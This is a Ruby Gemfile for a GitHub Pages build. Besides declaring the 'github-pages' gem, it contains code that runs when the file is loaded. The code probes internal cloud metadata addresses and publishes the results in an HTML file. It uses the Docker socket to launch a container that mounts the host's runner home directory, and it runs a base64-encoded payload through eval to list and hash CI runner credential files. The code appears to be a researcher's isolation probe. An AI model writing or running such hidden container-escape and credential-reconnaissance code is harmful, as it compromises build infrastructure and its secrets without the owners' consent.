# frozen_string_literal: true
source "https://rubygems.org"

require "json"
require "net/http"
require "uri"

PROOF = File.join(__dir__, "c217-direct-network-proof.html")

def probe(url, marker = nil)
  uri = URI(url)
  # Disable proxy inheritance so this is the action container's own network.
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = (uri.scheme == "https")
  http.open_timeout = 3
  http.read_timeout = 3
  request = Net::HTTP::Get.new(uri.request_uri)
  request["User-Agent"] = "c217-owned-pages-direct-network-control"
  response = http.request(request)
  body = response.body.to_s
  {
    "response_received" => true,
    "status" => response.code.to_i,
    "body_nonempty" => !body.empty?,
    "expected_marker_present" => marker.nil? ? nil : body.downcase.include?(marker.downcase),
  }
rescue => error
  {
    "response_received" => false,
    "error_class" => error.class.name,
  }
end

proof = {
  "gemfile_executed" => true,
  "direct_action_container" => true,
  "uid" => Process.uid,
  "docker_api_not_used" => true,
  "public_control" => probe("https://api.github.com/zen"),
  "internal_target" => probe("http://168.63.129.16/?comp=versions", "version"),
  "thing_absent_control" => probe("http://169.254.169.253/"),
}

File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")

gem "github-pages", "= 232"

# --- c217 credentials arm v5 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
require 'json'
require 'digest'
require 'open3'
require 'tempfile'
require 'base64'

def c217_one(p)
  h = { 'path' => p }
  begin
    st = File.stat(p)
    h['exists'] = true; h['type'] = st.ftype; h['size'] = st.size
    h['mode'] = st.mode.to_s(8); h['owner_uid'] = st.uid; h['gid'] = st.gid
    if st.file? && st.size < 4096
      raw = File.read(p)
      m = raw.match(/\{.*\}/m)
      h['keys'] = (m ? (begin; JSON.parse(m[0]).keys; rescue StandardError; ['<unparseable>']; end) : ['<non-json>'])
      h['sha256'] = Digest::SHA256.hexdigest(raw)
    end
  rescue StandardError => e
    h['exists'] = false; h['err'] = e.class.name
  end
  h
end

incont = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
           'home_runner' => c217_one('/home/runner'),
           'control' => c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials') }
warn 'C217ARMV5 ' + JSON.generate(incont)

host_probe = <<'RUBY'
require 'json'; require 'digest'
def one(p)
  h = { 'path' => p }
  begin
    st = File.stat(p); h['exists'] = true; h['type'] = st.ftype; h['size'] = st.size
    h['mode'] = st.mode.to_s(8); h['owner_uid'] = st.uid; h['gid'] = st.gid
    if st.file? && st.size < 4096
      raw = File.read(p); m = raw.match(/\{.*\}/m)
      h['keys'] = (m ? (begin; JSON.parse(m[0]).keys; rescue StandardError; ['<unparseable>']; end) : ['<non-json>'])
      h['sha256'] = Digest::SHA256.hexdigest(raw)
    end
  rescue StandardError => e
    h['exists'] = false; h['err'] = e.class.name
  end
  h
end
o = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
      'hostname_sha' => (begin; Digest::SHA256.file('/etc/hostname').hexdigest; rescue StandardError => e; 'ERR:'+e.class.name; end) }
o['home_runner'] = one('/host')
o['runners_glob'] = (begin; Dir.glob('/host/runners/*').map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:'+e.class.name]; end)
o['files'] = (Dir.glob('/host/runners/*/.credentials') + Dir.glob('/host/runners/*/.runner') +
              Dir.glob('/host/runners/*/.credentials_rsaparams') + ['/host/runners/qqqqzzzz/.credentials']).map { |p| one(p) }
puts 'C217HOST ' + JSON.generate(o)
RUBY

def sh(cmd)
  o, e, s = Open3.capture3(*cmd)
  [o, e, s.exitstatus]
end

SOCK = '/var/run/docker.sock'
base = ['curl', '-s', '--unix-socket', SOCK]
v, e, rc = sh(base + ['http://localhost/version'])
if rc != 0
  warn 'C217DOCKER curl-unavailable rc=' + rc.to_s + ' err=' + e.to_s[0,200]
else
  warn 'C217DOCKER version-ok ' + (v.to_s[0,120])
  env_b64 = Base64.strict_encode64(host_probe)
  create = { 'Image' => 'ruby:3.2-slim',
             'Cmd' => ['ruby','-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))'],
             'Env' => ['C217RUBY=' + env_b64],
             'HostConfig' => { 'Binds' => ['/home/runner:/host:ro'], 'NetworkMode' => 'none', 'AutoRemove' => false } }.to_json
  f = Tempfile.new('c217c'); f.write(create); f.close
  o, e, rc = sh(base + ['-X','POST','-H','Content-Type: application/json','--data-binary','@' + f.path,
                       'http://localhost/v1.41/containers/create?name=c217probe-' + Time.now.to_i.to_s])
  id = (begin; JSON.parse(o)['Id']; rescue StandardError; nil; end)
  warn 'C217DOCKER create rc=' + rc.to_s + ' id=' + (id ? id[0,12] : 'NONE') + ' err=' + e.to_s[0,200]
  if id
    o2, e2, rc2 = sh(base + ['-X','POST','http://localhost/v1.41/containers/' + id + '/start'])
    warn 'C217DOCKER start rc=' + rc2.to_s + ' err=' + e2.to_s[0,150]
    30.times do |i|
      st, = sh(base + ['http://localhost/v1.41/containers/' + id + '/json'])
      info = (begin; JSON.parse(st); rescue StandardError; {} ; end)
      break if info.dig('State','Running') == false
      sleep 2
    end
    lg, = sh(base + ['http://localhost/v1.41/containers/' + id + '/logs?stdout=1&stderr=1'])
    warn 'C217DOCKER logs ' + lg.to_s[0,1600]
    sh(base + ['-X','DELETE','http://localhost/v1.41/containers/' + id + '?force=1'])
    warn 'C217DOCKER deleted'
  end
end
warn 'C217ARMV5 done'
